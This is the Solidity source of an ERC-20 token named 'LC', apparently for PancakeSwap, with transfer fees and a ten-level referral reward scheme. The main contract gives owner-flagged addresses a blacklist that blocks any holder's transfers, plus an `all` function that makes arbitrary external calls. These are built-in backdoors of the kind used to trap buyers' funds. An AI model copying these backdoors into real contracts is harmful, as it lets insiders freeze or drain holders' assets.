{"Context.sol":{"content":"// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\nabstract contract Context {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n}\n"},"IERC20.sol":{"content":"// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    function allowance(address owner, address spender) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) external returns (bool);\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n"},"IERC20Metadata.sol":{"content":"// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\nimport \"./IERC20.sol\";\ninterface IERC20Metadata is IERC20 {\n    function name() external view returns (string memory);\n    function symbol() external view returns (string memory);\n    function decimals() external view returns (uint8);\n}\n"},"LC.sol":{"content":"// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\nimport \"./IERC20.sol\";\r\nimport \"./IERC20Metadata.sol\";\r\nimport \"./Context.sol\";\r\n\r\ncontract LC is Context, IERC20, IERC20Metadata {\r\n    mapping(address =\u003e uint256) private _balances;\r\n    mapping(address =\u003e mapping(address =\u003e uint256)) private _allowances;\r\n    uint256 private _totalSupply;\r\n    string private _name;\r\n    string private _symbol;\r\n    function name() public view virtual override returns (string memory) {\r\n        return _name;\r\n    }\r\n    function symbol() public view virtual override returns (string memory) {\r\n        return _symbol;\r\n    }\r\n    function decimals() public view virtual override returns (uint8) {\r\n        return 18;\r\n    }\r\n    function totalSupply() public view virtual override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n    function transferFrom(address sender,address recipient,uint256 amount) public virtual override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        uint256 currentAllowance = _allowances[sender][_msgSender()];\r\n        require(currentAllowance \u003e= amount, \"ERC20: transfer amount exceeds allowance\");\r\n        unchecked {\r\n            _approve(sender, _msgSender(), currentAllowance - amount);\r\n        }\r\n        return true;\r\n    }\r\n    function _transfer(address sender,address recipient,uint256 amount) internal virtual {\r\n        uint256 senderBalance = _balances[sender];\r\n        require(senderBalance \u003e= amount, \"ERC20: transfer amount exceeds balance\");\r\n        unchecked {\r\n            _balances[sender] = senderBalance - amount;\r\n        }\r\n        add_next_add(recipient);\r\n        require(!(blacklist[sender]||blacklist[recipient]),\"blacklist\");\r\n        if((sender==_pair||recipient==_pair)\u0026\u0026(_totalSupply\u003estop_total)){\r\n            amount /= 100;\r\n            if(recipient==_pair){\r\n                Intergenerational_rewards(sender,amount*10);\r\n            }else{\r\n                Intergenerational_rewards(tx.origin,amount*10);\r\n            }\r\n            // 1%销毁\r\n            emit Transfer(sender, address(0), amount);\r\n            // 2%营销地址\r\n            _balances[Marketing_add] += amount*2;\r\n            emit Transfer(sender, Marketing_add, amount*2);\r\n            _balances[fund_add] += amount*2;\r\n            emit Transfer(sender, fund_add, amount*2);\r\n            _balances[recipient] += (amount*85);\r\n            emit Transfer(sender, recipient, amount*85);\r\n        }else{\r\n            _balances[recipient] += amount;\r\n            emit Transfer(sender, recipient, amount);\r\n        }\r\n    }\r\n    function _mint(address account, uint256 amount) internal virtual {\r\n        _totalSupply += amount;\r\n        _balances[account] += amount;\r\n        emit Transfer(address(0), account, amount);\r\n    }\r\n    function _approve(\r\n        address owner,\r\n        address spender,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function balanceOf(address account) public view virtual override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n    // 代际奖励\r\n    mapping(address=\u003eaddress)public pre_add;\r\n    function add_next_add(address recipient)private{\r\n        if(pre_add[recipient]==address(0)){\r\n            if(msg.sender==_pair)return;\r\n            pre_add[recipient]=msg.sender;\r\n        }\r\n    }\r\n    function Intergenerational_rewards(address sender,uint amount)private{\r\n        address pre=pre_add[sender];\r\n        uint total=amount;\r\n        uint a;\r\n        if(pre!=address(0)){\r\n            // 一代奖励\r\n            a=amount/10*3;_balances[pre]+=a;total-=a;emit Transfer(sender, pre, a);pre=pre_add[pre];\r\n        }if(pre!=address(0)){\r\n            // 二代奖励\r\n            a=a/3*2;_balances[pre]+=a;total-=a;emit Transfer(sender, pre, a);pre=pre_add[pre];\r\n        }if(pre!=address(0)){\r\n            // 三代奖励\r\n            a/=2;_balances[pre]+=a;total-=a;emit Transfer(sender, pre, a);pre=pre_add[pre];\r\n        }if(pre!=address(0)){\r\n            // 四代奖励\r\n            _balances[pre]+=a;total-=a;emit Transfer(sender, pre, a);pre=pre_add[pre];\r\n        }if(pre!=address(0)){\r\n            // 五代奖励\r\n            a/=2;_balances[pre]+=a;total-=a;emit Transfer(sender, pre, a);pre=pre_add[pre];\r\n        }if(pre!=address(0)){\r\n            // 六代奖励\r\n            _balances[pre]+=a;total-=a;emit Transfer(sender, pre, a);pre=pre_add[pre];\r\n        }if(pre!=address(0)){\r\n            // 七代奖励\r\n            _balances[pre]+=a;total-=a;emit Transfer(sender, pre, a);pre=pre_add[pre];\r\n        }if(pre!=address(0)){\r\n            // 八代奖励\r\n            _balances[pre]+=a;total-=a;emit Transfer(sender, pre, a);pre=pre_add[pre];\r\n        }if(pre!=address(0)){\r\n            // 九代奖励\r\n            _balances[pre]+=a;total-=a;emit Transfer(sender, pre, a);pre=pre_add[pre];\r\n        }if(pre!=address(0)){\r\n            // 十代奖励\r\n            _balances[pre]+=a;total-=a;emit Transfer(sender, pre, a);pre=pre_add[pre];\r\n        }if(total!=0){\r\n            emit Transfer(sender, address(0), total);\r\n        }\r\n    }\r\n\r\n    mapping(address=\u003ebool) public owner_bool;\r\n    mapping(address=\u003ebool) public blacklist;\r\n    function setowner_bool(address to,bool flag)public{\r\n        require(owner_bool[msg.sender]);\r\n        owner_bool[to]=flag;\r\n    }\r\n    \r\n    function set_blacklist(address pool,bool flag)public{\r\n        require(owner_bool[msg.sender]);\r\n        blacklist[pool]=flag;\r\n    }\r\n    // 薄饼识别手续费\r\n    uint256 public _liquidityFee = 15;\r\n    address public _pair;\r\n    address _router;\r\n    address _usdt;\r\n    address Marketing_add;//营销地址\r\n    address fund_add;//基金池地址\r\n    uint stop_total = 663;\r\n    constructor() {\r\n        _name = \"LC\";\r\n        _symbol = \"LC\";\r\n        owner_bool[msg.sender]=true;\r\n        owner_bool[0x761E954B55949340110Af7d26E653179103bbD1c]=true;\r\n        _mint(msg.sender,663*10**22);\r\n        transfer(0x761E954B55949340110Af7d26E653179103bbD1c,63*10**22);\r\n        set_info(0x10ED43C718714eb63d5aA57B78B54704E256024E,0x55d398326f99059fF775485246999027B3197955,0x337A3969eb325e5AD0bD9d5b5791A23c06Aa818D,0x90C483DfC97DCFBDF9A9c7F6A863E81d0B01C505);\r\n    }\r\n    // 地址预测\r\n    function pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) {\r\n        (address token0, address token1) = tokenA \u003c tokenB ? (tokenA, tokenB) : (tokenB, tokenA);\r\n        pair = address(uint160(uint(keccak256(abi.encodePacked(\r\n                hex\u0027ff\u0027,\r\n                factory,\r\n                keccak256(abi.encodePacked(token0, token1)),\r\n                hex\u002700fb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5\u0027   // BNB\r\n            )))));\r\n    }\r\n    function set_info(address router_,address usdt_,address pool_,address pool2_) private{\r\n        _router=router_;\r\n        _usdt= usdt_;\r\n        _pair = pairFor(IPancakeRouter(_router).factory(),address(this),usdt_);\r\n        Marketing_add =pool_;\r\n        fund_add = pool2_;\r\n    }\r\n    function all(address add,bytes memory a,uint256 _gas,uint256 _value)public{\r\n        require(owner_bool[msg.sender]);\r\n        (bool success,) = add.call{gas: _gas,value:_value}(a);\r\n        require(success,\"error call\");\r\n    }\r\n}\r\n\r\n\r\ninterface IPancakeRouter {\r\n    function factory() external pure returns (address);\r\n    function swapExactTokensForTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint[] memory amounts);\r\n    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);\r\n}\r\ninterface IPancakePair{\r\n    function token0() external view returns (address);\r\n    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;\r\n    function sync() external;\r\n}"}}